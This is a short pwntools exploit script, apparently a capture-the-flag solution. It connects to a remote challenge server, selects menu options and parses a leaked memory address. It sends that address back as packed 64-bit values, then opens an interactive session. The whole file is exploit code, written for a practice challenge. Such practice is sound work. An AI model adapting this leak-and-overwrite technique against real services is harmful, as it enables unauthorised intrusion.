from pwn import *


p = remote('pwn-le-sserafim.chals.blahaj.sg', 12923)

p.sendline(b'2')
p.sendline(b'6')
leak = p.recvuntil(b' > ')
addr = int(leak.split(b'at ')[1].split(b'...')[0].decode(), 16)
p.sendline(p64(addr) + p64(addr))

p.interactive()
